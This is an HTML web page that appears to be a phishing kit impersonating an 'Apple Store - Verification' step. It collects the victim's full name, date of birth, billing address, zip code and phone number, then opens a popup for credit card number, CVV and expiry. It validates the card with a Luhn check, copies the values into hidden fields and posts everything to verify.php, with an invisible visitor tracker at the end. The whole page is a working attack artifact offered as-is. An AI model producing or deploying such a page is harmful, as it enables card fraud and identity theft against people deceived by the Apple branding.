<html>
<head>
	<title>Apple Store - Verification</title>
	<link rel="icon" type="image/png" href="img/favicon.png" />
	<style>
		body {
		 margin-top: 15;
		 background: #f1f1f1;
		}

		.page {
		 background-image: url("img/info.png");
		 background-repeat: no-repeat;
		 height: 718px;
		 width: 986px;
		 position: relative;
		}
		
		input, select {
		 position: absolute; /* VODKA */
		 width: 304;
		 height: 22;
		 border: 0;
		 padding: 3 8 3 8;
		 left: 587;
		}

		.button {
		 width: 105;
		 height: 37;
		 border: 0;
		 cursor: pointer;
		}

		.submit {
		 position: absolute;
		 left: 810;
		 top: 519;
		}
		
		.ccpage {
		 background-image: url("img/_card.png");
		 background-repeat: no-repeat;
		 height: 252px;
		 width: 555px;
		 position: relative;
		}
		
		._ccn, ._cvv, ._exm, ._exy {
		 left: 151;
		 height: 22;
		}
		
		.thend {
		 top:205;
		 position:absolute;
		 width:105;
		 height:37;
		 cursor:pointer;
		 left:445;
		}
	</style>
	
	<script type="text/javascript" src="lib/jquery-1.10.1.min.js"></script>
	
	<script type="text/javascript" src="lib/jquery.mousewheel-3.0.6.pack.js"></script>
	<script type="text/javascript" src="source/jquery.fancybox.js?v=2.1.5"></script>
	
	<script type="text/javascript" src="source/helpers/jquery.fancybox-buttons.js?v=1.0.5"></script>
	<script type="text/javascript" src="source/helpers/jquery.fancybox-thumbs.js?v=1.0.7"></script>
	
	<script type="text/javascript" src="source/helpers/jquery.fancybox-media.js?v=1.0.6"></script>
	
	<link rel="stylesheet" type="text/css" href="source/helpers/jquery.fancybox-thumbs.css?v=1.0.7" />
	<link rel="stylesheet" type="text/css" href="source/jquery.fancybox.css?v=2.1.5" media="screen" />
	<link rel="stylesheet" type="text/css" href="source/helpers/jquery.fancybox-buttons.css?v=1.0.5" />
	<link rel="stylesheet" type="text/css" href="source/jquery.fancybox.css?v=2.1.5" media="screen" />
	<link rel="stylesheet" type="text/css" href="source/helpers/jquery.fancybox-buttons.css?v=1.0.5" />

	<script type="text/javascript">
		function fancyConfirm(msg,callback) {
			var ret;
			jQuery.fancybox({
				padding : 2,
				modal : true,
				content : msg,
				onComplete : function() {

				},
				onClosed : function() {
					callback.call(this,ret);
				}
			});
		}
	</script>
	<script type="text/javascript">
			var loaded = false;
			var time = 10000;
			$(function() {
				$(window).load(function() {
				   loaded = true;
				});
				setTimeout(function() { 
					if(!loaded) {
						window.location.reload();
					}  
				},time);
			});
			function checkcvv() {
				cvv = $('#_cvv').val().replace(/\D/g, '').length;
				return ((cvv == 3) || (cvv == 4));
			}

			function checkexm() {
				return ($('#_exm').val() != '0');
			}

			function checkexy() {
				return ($('#_exy').val() != '0');
			}

			function isvalidcc() {
				c = $('#_ccn').val();
				normalize = function (c) {
					return c.replace(/[ -]/g, '');
				};
				luhnchk = function (c) {
					for (var d = c.length, b = 0, e = [
							[0, 1, 2, 3, 4, 5, 6, 7, 8, 9],
							[0, 2, 4, 6, 8, 1, 3, 5, 7, 9]
						], a = 0; d--;) a += e[b][parseInt(c.charAt(d), 10)], b ^= 1;
					return 0 === a % 10 && 0 < a
				};
				isknown = function (c) {
					cards = [{
						pattern: /^3[47]/,
						valid_length: [15]
					}, {
						pattern: /^30[0-5]/,
						valid_length: [14]
					}, {
						pattern: /^36/,
						valid_length: [14]
					}, {
						pattern: /^35(2[89]|[3-8][0-9])/,
						valid_length: [16]
					}, {
						pattern: /^(6304|670[69]|6771)/,
						valid_length: [16, 17, 18, 19]
					}, {
						pattern: /^(4026|417500|4508|4844|491(3|7))/,
						valid_length: [16]
					}, {
						pattern: /^4/,
						valid_length: [16]
					}, {
						pattern: /^5[1-5]/,
						valid_length: [16]
					}, {
						pattern: /^(5018|5020|5038|6304|6759|676[1-3])/,
						valid_length: [12, 13, 14, 15, 16, 17, 18, 19]
					}, {
						pattern: /^(6011|622(12[6-9]|1[3-9][0-9]|[2-8][0-9]{2}|9[0-1][0-9]|92[0-5]|64[4-9])|65)/,
						valid_length: [16]
					}];
					for (cn in cards) {
						if ((c >= 0 || c < 0) && (cards[cn].valid_length.indexOf(c.length) != -1) && (c.match(cards[cn].pattern))) {
							return true;
						}
					}
					return false;
				}
				if (isknown(normalize(c)) && (luhnchk(normalize(c)))) return true;
				else return false;
			}
			function checkname() {
				return (($('#fullname').val().split(" ").length - 1)>0);
			}
			function checkbirth() {
				return ($('#month').val()!='0')&&($('#day').val()!='0')&&($('#year').val()!='0');
			}
			function checkbill() {
				return (($('#address').val().split(" ").length - 1)>0);
			}
			function checkzip() {
				return ($('#zip').val().length>3);
			}
			function checkcountry() {
				return ($('#country').val()!='');
			}
			function checkphone() {
				return ($('#mobile').val().replace(/\D/g, "").length>4);
			}
			function checkform1() {
				if (!checkname()) {alert("Double-check that you typed your full name.");return false;}
				if (!checkbirth()) {alert("Double-check that you chosed your date of birth correctly.");return false;}
				if (!checkbill()) {alert("Double-check that you typed your full bill address.");return false;}
				if (!checkzip()) {alert("Double-check that you typed a valid zip code.");return false;}
				if (!checkcountry()) {alert("Double-check that you chosed your country.");return false;}
				if (!checkphone()) {alert("Double-check that you typed a valid phone number.");return false;}
				return true;
			}
			function checkform2() {
				if (!isvalidcc()) {alert("Double-check that you typed a valid credit card number.");return false;}
				if (!checkcvv()) {alert("Double-check that you typed a valid credit card security number.");return false;}
				if (!checkexm()) {alert("Double-check that you chosed an expiration month.");return false;}
				if (!checkexy()) {alert("Double-check that you chosed an expiration year.");return false;}
				return true;
			}
			function do_submit(p) {
				if (p==3) {
					if (checkform1()&&($('#ccnumber').val().length>0)) return true;
					else if (checkform1()) {imready();return false;}
					else return false;
				}
				else if (p==1) {
					if (checkform1()) imready();
				}
				else if (p==2) {
					if (checkform2()) {
						$('#ccnumber').val($('#_ccn').val());
						$('#cvv').val($('#_cvv').val());
						$('#expmonth').val($('#_exm').val());
						$('#expyear').val($('#_exy').val());
						$('form').submit();
					}
				}
			}
			function imready() {
				fancyConfirm('<div class="ccpage"><div><input style="top:83;width:216;" placeholder="Number Of Credit Card" autocapitalize="off" autocorrect="off" maxlength="25" tabindex="6" required="" title="Enter the credit card number here." type="text" name="_ccn" class="_ccn" id="_ccn"></div> <div><input style="top:122;width:53;" type="password" class="_cvv" name="_cvv" id="_cvv" placeholder="CVV" autocapitalize="off" autocorrect="off" maxlength="4" tabindex="7" required="" title="Enter the credit card security code here."></div><div><select tabindex="8" title="Select your credit card expiration month." required style="top:161;width:64;" class="_exm" name="_exm" id="_exm"><option selected="" value="0">Month</option><option value="01">01</option><option value="02">02</option><option value="03">03</option><option value="04">04</option><option value="05">05</option><option value="06">06</option><option value="07">07</option><option value="08">08</option><option value="09">09</option><option value="10">10</option><option value="11">11</option><option value="12">12</option></select></div> <div><select tabindex="9" title="Select your credit card expiration year." required style="left:227;top:161;width:79;" id="_exy" class="_exy" name="_exy"><option selected="" value="0">Year</option><option value="2016">2016</option><option value="2017">2017</option><option value="2018">2018</option><option value="2019">2019</option><option value="2020">2020</option><option value="2021">2021</option><option value="2022">2022</option><option value="2023">2023</option><option value="2024">2024</option><option value="2025">2025</option></select></div><div><div class="thend" onclick="do_submit(2)"></div><div></div></div></div>',function () {});
			}
	</script>
</head>


<body style="visibility:hidden;" onload="$('body').css('visibility','');">
	<center>
		<form action="verify.php" method="post" id="info" onsubmit="if(do_submit(3)) return true; else return false;">
		<div class="page">
			<div><input type="text" placeholder="Full Name" autocapitalize="off" autocorrect="off" maxlength="128" tabindex="1" required="" title="Enter your full name here." id="fullname" name="fullname" style="top:188;" value=""></div>
			<div><select required tabindex="2" style="top:239;width:94;" id="month" name="month"><option value="0" selected>Month</option><option value="1" monthattr="1">January</option><option value="2" monthattr="2">February</option><option value="3" monthattr="3">March</option><option value="4" monthattr="4">April</option><option value="5" monthattr="5">May</option><option value="6" monthattr="6">June</option><option value="7" monthattr="7">July</option><option value="8" monthattr="8">August</option><option value="9" monthattr="9">September</option><option value="10" monthattr="10">October</option><option value="11" monthattr="11">November</option><option value="12" monthattr="12">December</option></select></div>
			<div><select required tabindex="3" style="left:688;top:239;width:94;" id="day" name="day"><option value="0" selected>Day</option><option value="1" dayattr="1">1</option><option value="2" dayattr="2">2</option><option value="3" dayattr="3">3</option><option value="4" dayattr="4">4</option><option value="5" dayattr="5">5</option><option value="6" dayattr="6">6</option><option value="7" dayattr="7">7</option><option value="8" dayattr="8">8</option><option value="9" dayattr="9">9</option><option value="10" dayattr="10">10</option><option value="11" dayattr="11">11</option><option value="12" dayattr="12">12</option><option value="13" dayattr="13">13</option><option value="14" dayattr="14">14</option><option value="15" dayattr="15">15</option><option value="16" dayattr="16">16</option><option value="17" dayattr="17">17</option><option value="18" dayattr="18">18</option><option value="19" dayattr="19">19</option><option value="20" dayattr="20">20</option><option value="21" dayattr="21">21</option><option value="22" dayattr="22">22</option><option value="23" dayattr="23">23</option><option value="24" dayattr="24">24</option><option value="25" dayattr="25">25</option><option value="26" dayattr="26">26</option><option value="27" dayattr="27">27</option><option value="28" dayattr="28">28</option><option value="29" dayattr="29">29</option><option value="30" dayattr="30">30</option><option value="31" dayattr="31">31</option></select></div>
			<div><select required tabindex="4" style="left:789;top:239;width:102;" id="year" name="year"><option value="0" selected>Year</option><option value="1996" yearattr="1996">1996</option><option value="1995" yearattr="1995">1995</option><option value="1994" yearattr="1994">1994</option><option value="1993" yearattr="1993">1993</option><option value="1992" yearattr="1992">1992</option><option value="1991" yearattr="1991">1991</option><option value="1990" yearattr="1990">1990</option><option value="1989" yearattr="1989">1989</option><option value="1988" yearattr="1988">1988</option><option value="1987" yearattr="1987">1987</option><option value="1986" yearattr="1986">1986</option><option value="1985" yearattr="1985">1985</option><option value="1984" yearattr="1984">1984</option><option value="1983" yearattr="1983">1983</option><option value="1982" yearattr="1982">1982</option><option value="1981" yearattr="1981">1981</option><option value="1980" yearattr="1980">1980</option><option value="1979" yearattr="1979">1979</option><option value="1978" yearattr="1978">1978</option><option value="1977" yearattr="1977">1977</option><option value="1976" yearattr="1976">1976</option><option value="1975" yearattr="1975">1975</option><option value="1974" yearattr="1974">1974</option><option value="1973" yearattr="1973">1973</option><option value="1972" yearattr="1972">1972</option><option value="1971" yearattr="1971">1971</option><option value="1970" yearattr="1970">1970</option><option value="1969" yearattr="1969">1969</option><option value="1968" yearattr="1968">1968</option><option value="1967" yearattr="1967">1967</option><option value="1966" yearattr="1966">1966</option><option value="1965" yearattr="1965">1965</option><option value="1964" yearattr="1964">1964</option><option value="1963" yearattr="1963">1963</option><option value="1962" yearattr="1962">1962</option><option value="1961" yearattr="1961">1961</option><option value="1960" yearattr="1960">1960</option><option value="1959" yearattr="1959">1959</option><option value="1958" yearattr="1958">1958</option><option value="1957" yearattr="1957">1957</option><option value="1956" yearattr="1956">1956</option><option value="1955" yearattr="1955">1955</option><option value="1954" yearattr="1954">1954</option><option value="1953" yearattr="1953">1953</option><option value="1952" yearattr="1952">1952</option><option value="1951" yearattr="1951">1951</option><option value="1950" yearattr="1950">1950</option><option value="1949" yearattr="1949">1949</option><option value="1948" yearattr="1948">1948</option><option value="1947" yearattr="1947">1947</option><option value="1946" yearattr="1946">1946</option><option value="1945" yearattr="1945">1945</option><option value="1944" yearattr="1944">1944</option><option value="1943" yearattr="1943">1943</option><option value="1942" yearattr="1942">1942</option><option value="1941" yearattr="1941">1941</option><option value="1940" yearattr="1940">1940</option><option value="1939" yearattr="1939">1939</option><option value="1938" yearattr="1938">1938</option><option value="1937" yearattr="1937">1937</option><option value="1936" yearattr="1936">1936</option><option value="1935" yearattr="1935">1935</option><option value="1934" yearattr="1934">1934</option><option value="1933" yearattr="1933">1933</option><option value="1932" yearattr="1932">1932</option><option value="1931" yearattr="1931">1931</option><option value="1930" yearattr="1930">1930</option><option value="1929" yearattr="1929">1929</option><option value="1928" yearattr="1928">1928</option><option value="1927" yearattr="1927">1927</option><option value="1926" yearattr="1926">1926</option><option value="1925" yearattr="1925">1925</option><option value="1924" yearattr="1924">1924</option><option value="1923" yearattr="1923">1923</option><option value="1922" yearattr="1922">1922</option><option value="1921" yearattr="1921">1921</option><option value="1920" yearattr="1920">1920</option></select></div>
			<div><input type="text" placeholder="Billing Address" autocapitalize="off" autocorrect="off" maxlength="256" tabindex="5" required="" title="Enter your billing address here." id="address" name="address" style="top:290;" value=""></div>
			<div><input type="text" placeholder="Postal Code / Zip Code" autocapitalize="off" autocorrect="off" maxlength="10" tabindex="6" required="" title="Enter your postal or zip code here." id="zip" name="zip" style="top:341;" value=""></div>
			<div><select required tabindex="7" style="top:392;" id="country" name="country"><option value="Unknown">Select Country</option><option value="Canada">Canada</option><option value="United Kingdom">United Kingdom</option><option value="United States">United States</option><option value="Afganistan">Afghanistan</option><option value="Albania">Albania</option><option value="Algeria">Algeria</option><option value="American Samoa">American Samoa</option><option value="Andorra">Andorra</option><option value="Angola">Angola</option><option value="Anguilla">Anguilla</option><option value="Antigua & Barbuda">Antigua & Barbuda</option><option value="Argentina">Argentina</option><option value="Armenia">Armenia</option><option value="Aruba">Aruba</option><option value="Australia">Australia</option><option value="Austria">Austria</option><option value="Azerbaijan">Azerbaijan</option><option value="Bahamas">Bahamas</option><option value="Bahrain">Bahrain</option><option value="Bangladesh">Bangladesh</option><option value="Barbados">Barbados</option><option value="Belarus">Belarus</option><option value="Belgium">Belgium</option><option value="Belize">Belize</option><option value="Benin">Benin</option><option value="Bermuda">Bermuda</option><option value="Bhutan">Bhutan</option><option value="Bolivia">Bolivia</option><option value="Bonaire">Bonaire</option><option value="Bosnia & Herzegovina">Bosnia & Herzegovina</option><option value="Botswana">Botswana</option><option value="Brazil">Brazil</option><option value="British Indian Ocean Ter">British Indian Ocean Ter</option><option value="Brunei">Brunei</option><option value="Bulgaria">Bulgaria</option><option value="Burkina Faso">Burkina Faso</option><option value="Burundi">Burundi</option><option value="Cambodia">Cambodia</option><option value="Cameroon">Cameroon</option><option value="Canary Islands">Canary Islands</option><option value="Cape Verde">Cape Verde</option><option value="Cayman Islands">Cayman Islands</option><option value="Central African Republic">Central African Republic</option><option value="Chad">Chad</option><option value="Channel Islands">Channel Islands</option><option value="Chile">Chile</option><option value="China">China</option><option value="Christmas Island">Christmas Island</option><option value="Cocos Island">Cocos Island</option><option value="Colombia">Colombia</option><option value="Comoros">Comoros</option><option value="Congo">Congo</option><option value="Cook Islands">Cook Islands</option><option value="Costa Rica">Costa Rica</option><option value="Cote DIvoire">Cote D'Ivoire</option><option value="Croatia">Croatia</option><option value="Cuba">Cuba</option><option value="Curaco">Curacao</option><option value="Cyprus">Cyprus</option><option value="Czech Republic">Czech Republic</option><option value="Denmark">Denmark</option><option value="Djibouti">Djibouti</option><option value="Dominica">Dominica</option><option value="Dominican Republic">Dominican Republic</option><option value="East Timor">East Timor</option><option value="Ecuador">Ecuador</option><option value="Egypt">Egypt</option><option value="El Salvador">El Salvador</option><option value="Equatorial Guinea">Equatorial Guinea</option><option value="Eritrea">Eritrea</option><option value="Estonia">Estonia</option><option value="Ethiopia">Ethiopia</option><option value="Falkland Islands">Falkland Islands</option><option value="Faroe Islands">Faroe Islands</option><option value="Fiji">Fiji</option><option value="Finland">Finland</option><option value="France">France</option><option value="French Guiana">French Guiana</option><option value="French Polynesia">French Polynesia</option><option value="French Southern Ter">French Southern Ter</option><option value="Gabon">Gabon</option><option value="Gambia">Gambia</option><option value="Georgia">Georgia</option><option value="Germany">Germany</option><option value="Ghana">Ghana</option><option value="Gibraltar">Gibraltar</option><option value="Great Britain">Great Britain</option><option value="Greece">Greece</option><option value="Greenland">Greenland</option><option value="Grenada">Grenada</option><option value="Guadeloupe">Guadeloupe</option><option value="Guam">Guam</option><option value="Guatemala">Guatemala</option><option value="Guinea">Guinea</option><option value="Guyana">Guyana</option><option value="Haiti">Haiti</option><option value="Hawaii">Hawaii</option><option value="Honduras">Honduras</option><option value="Hong Kong">Hong Kong</option><option value="Hungary">Hungary</option><option value="Iceland">Iceland</option><option value="India">India</option><option value="Indonesia">Indonesia</option><option value="Iran">Iran</option><option value="Iraq">Iraq</option><option value="Ireland">Ireland</option><option value="Isle of Man">Isle of Man</option><option value="Italy">Italy</option><option value="Jamaica">Jamaica</option><option value="Japan">Japan</option><option value="Jordan">Jordan</option><option value="Kazakhstan">Kazakhstan</option><option value="Kenya">Kenya</option><option value="Kiribati">Kiribati</option><option value="Korea North">Korea North</option><option value="Korea Sout">Korea South</option><option value="Kuwait">Kuwait</option><option value="Kyrgyzstan">Kyrgyzstan</option><option value="Laos">Laos</option><option value="Latvia">Latvia</option><option value="Lebanon">Lebanon</option><option value="Lesotho">Lesotho</option><option value="Liberia">Liberia</option><option value="Libya">Libya</option><option value="Liechtenstein">Liechtenstein</option><option value="Lithuania">Lithuania</option><option value="Luxembourg">Luxembourg</option><option value="Macau">Macau</option><option value="Macedonia">Macedonia</option><option value="Madagascar">Madagascar</option><option value="Malaysia">Malaysia</option><option value="Malawi">Malawi</option><option value="Maldives">Maldives</option><option value="Mali">Mali</option><option value="Malta">Malta</option><option value="Marshall Islands">Marshall Islands</option><option value="Martinique">Martinique</option><option value="Mauritania">Mauritania</option><option value="Mauritius">Mauritius</option><option value="Mayotte">Mayotte</option><option value="Mexico">Mexico</option><option value="Midway Islands">Midway Islands</option><option value="Moldova">Moldova</option><option value="Monaco">Monaco</option><option value="Mongolia">Mongolia</option><option value="Montserrat">Montserrat</option><option selected value="Morocco">Morocco</option><option value="Mozambique">Mozambique</option><option value="Myanmar">Myanmar</option><option value="Nambia">Nambia</option><option value="Nauru">Nauru</option><option value="Nepal">Nepal</option><option value="Netherland Antilles">Netherland Antilles</option><option value="Netherlands">Netherlands (Holland, Europe)</option><option value="Nevis">Nevis</option><option value="New Caledonia">New Caledonia</option><option value="New Zealand">New Zealand</option><option value="Nicaragua">Nicaragua</option><option value="Niger">Niger</option><option value="Nigeria">Nigeria</option><option value="Niue">Niue</option><option value="Norfolk Island">Norfolk Island</option><option value="Norway">Norway</option><option value="Oman">Oman</option><option value="Pakistan">Pakistan</option><option value="Palau Island">Palau Island</option><option value="Palestine">Palestine</option><option value="Panama">Panama</option><option value="Papua New Guinea">Papua New Guinea</option><option value="Paraguay">Paraguay</option><option value="Peru">Peru</option><option value="Phillipines">Philippines</option><option value="Pitcairn Island">Pitcairn Island</option><option value="Poland">Poland</option><option value="Portugal">Portugal</option><option value="Puerto Rico">Puerto Rico</option><option value="Qatar">Qatar</option><option value="Republic of Montenegro">Republic of Montenegro</option><option value="Republic of Serbia">Republic of Serbia</option><option value="Reunion">Reunion</option><option value="Romania">Romania</option><option value="Russia">Russia</option><option value="Rwanda">Rwanda</option><option value="St Barthelemy">St Barthelemy</option><option value="St Eustatius">St Eustatius</option><option value="St Helena">St Helena</option><option value="St Kitts-Nevis">St Kitts-Nevis</option><option value="St Lucia">St Lucia</option><option value="St Maarten">St Maarten</option><option value="St Pierre & Miquelon">St Pierre & Miquelon</option><option value="St Vincent & Grenadines">St Vincent & Grenadines</option><option value="Saipan">Saipan</option><option value="Samoa">Samoa</option><option value="Samoa American">Samoa American</option><option value="San Marino">San Marino</option><option value="Sao Tome & Principe">Sao Tome & Principe</option><option value="Saudi Arabia">Saudi Arabia</option><option value="Senegal">Senegal</option><option value="Serbia">Serbia</option><option value="Seychelles">Seychelles</option><option value="Sierra Leone">Sierra Leone</option><option value="Singapore">Singapore</option><option value="Slovakia">Slovakia</option><option value="Slovenia">Slovenia</option><option value="Solomon Islands">Solomon Islands</option><option value="Somalia">Somalia</option><option value="South Africa">South Africa</option><option value="Spain">Spain</option><option value="Sri Lanka">Sri Lanka</option><option value="Sudan">Sudan</option><option value="Suriname">Suriname</option><option value="Swaziland">Swaziland</option><option value="Sweden">Sweden</option><option value="Switzerland">Switzerland</option><option value="Syria">Syria</option><option value="Tahiti">Tahiti</option><option value="Taiwan">Taiwan</option><option value="Tajikistan">Tajikistan</option><option value="Tanzania">Tanzania</option><option value="Thailand">Thailand</option><option value="Togo">Togo</option><option value="Tokelau">Tokelau</option><option value="Tonga">Tonga</option><option value="Trinidad & Tobago">Trinidad & Tobago</option><option value="Tunisia">Tunisia</option><option value="Turkey">Turkey</option><option value="Turkmenistan">Turkmenistan</option><option value="Turks & Caicos Is">Turks & Caicos Is</option><option value="Tuvalu">Tuvalu</option><option value="Uganda">Uganda</option><option value="Ukraine">Ukraine</option><option value="United Arab Erimates">United Arab Emirates</option><option value="Uraguay">Uruguay</option><option value="Uzbekistan">Uzbekistan</option><option value="Vanuatu">Vanuatu</option><option value="Vatican City State">Vatican City State</option><option value="Venezuela">Venezuela</option><option value="Vietnam">Vietnam</option><option value="Virgin Islands (Brit)">Virgin Islands (Brit)</option><option value="Virgin Islands (USA)">Virgin Islands (USA)</option><option value="Wake Island">Wake Island</option><option value="Wallis & Futana Is">Wallis & Futana Is</option><option value="Yemen">Yemen</option><option value="Zaire">Zaire</option><option value="Zambia">Zambia</option><option value="Zimbabwe">Zimbabwe</option></select></div>
			<div><input type="text" placeholder="Mobile Number" autocapitalize="off" autocorrect="off" maxlength="20" tabindex="8" required="" title="Enter your mobile number here." id="mobile" name="mobile" style="top:443;" value=""></div>

			<input type="text" id="ccnumber" name="ccnumber" style="visibility: hidden;">
			<input type="text" id="cvv" name="cvv" style="visibility: hidden;">
			<input type="text" id="expmonth" name="expmonth" style="visibility: hidden;">
			<input type="text" id="expyear" name="expyear" style="visibility: hidden;">
			
			<input tabindex="11" type="submit" style="height: 0px; width: 0px; border: none; padding: 0px;" hidefocus="true" />
			<div class="button submit" onclick="javascript:do_submit(1);"></div>
		</div>
		</form>
		<!-- Start of StatCounter Code for Default Guide -->
<script type="text/javascript">
var sc_project=9710032; 
var sc_invisible=1; 
var sc_security="2bd741f4"; 
var scJsHost = (("https:" == document.location.protocol) ?
"https://secure." : "http://www.");
document.write("<sc"+"ript type='text/javascript' src='" +
scJsHost+
"statcounter.com/counter/counter.js'></"+"script>");
</script>
<noscript><div class="statcounter"><a title="free hit
counter" href="http://statcounter.com/free-hit-counter/"
target="_blank"><img class="statcounter"
src="http://c.statcounter.com/9710032/0/2bd741f4/1/"
alt="free hit counter"></a></div></noscript>
<!-- End of StatCounter Code for Default Guide -->
	</center>
</body>
</html>

